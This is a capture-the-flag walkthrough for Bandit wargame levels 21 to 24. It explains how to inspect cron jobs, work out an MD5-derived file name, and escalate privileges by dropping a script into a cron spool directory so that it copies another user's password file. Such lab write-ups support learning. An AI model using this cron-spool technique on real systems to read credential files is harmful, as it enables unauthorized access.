## Level 21 → Level 22
* **Objective:** Inspect the scheduled cron jobs in `/etc/cron.d/` to locate where `bandit22`'s cron script copies its password file.
* **Command:**
  ```bash
  cat /etc/cron.d/cronjob_bandit22
  cat /usr/bin/cronjob_bandit22.sh
  cat /tmp/<TARGET_FILENAME>
  ```
* **Key Concept:** Cron jobs in `/etc/cron.d/` run scripts automatically on a schedule as the specified user (`bandit22`). Reading the world-readable shell script reveals the exact `/tmp` file path where the password is written.
* **Password:** `<REDACTED>`

---

## Level 22 → Level 23
* **Objective:** Reverse-engineer `cronjob_bandit23.sh` to calculate the MD5-hashed `/tmp` filename generated when the script runs as `bandit23`.
* **Command:**
  ```bash
  cat /etc/cron.d/cronjob_bandit23
  cat /usr/bin/cronjob_bandit23.sh
  echo I am user bandit23 | md5sum | cut -d ' ' -f 1
  cat /tmp/8ca319486bfbbc3663ea0fbe81326349
  ```
* **Key Concept:** Because `$(whoami)` evaluates to `bandit23` when executed by the cron daemon, manually computing the MD5 hash of `"I am user bandit23"` (and trimming the trailing `-` with `cut -d ' ' -f 1`) reveals the exact target filename in `/tmp/`.
* **Password:** `<REDACTED>`

---

## Level 23 → Level 24
* **Objective:** Exploit the cron job running as `bandit24`—which automatically executes and deletes any script owned by `bandit23` inside `/var/spool/bandit24/foo`—to copy `/etc/bandit_pass/bandit24` into a writable directory.
* **Command:**
  ```bash
  cat /etc/cron.d/cronjob_bandit24
  cat /usr/bin/cronjob_bandit24.sh

  mkdir /tmp/level-24 && cd /tmp/level-24
  cat << 'EOF' > script.sh
  #!/bin/bash
  cat /etc/bandit_pass/bandit24 > /tmp/level-24/password
  EOF

  chmod 777 -R /tmp/level-24/
  mv script.sh /var/spool/bandit24/foo

  # Wait ~60 seconds for the cron job to execute and remove script.sh
  cat /tmp/level-24/password
  ```
* **Key Concept:** Arbitrary script execution via cron privilege escalation—any executable file owned by `bandit23` dropped into `/var/spool/bandit24/foo` runs with `bandit24` privileges every minute, allowing the payload script to read `bandit24`'s restricted password file and write it out to `/tmp/level-24/password`.
* **Password:** `<REDACTED>`
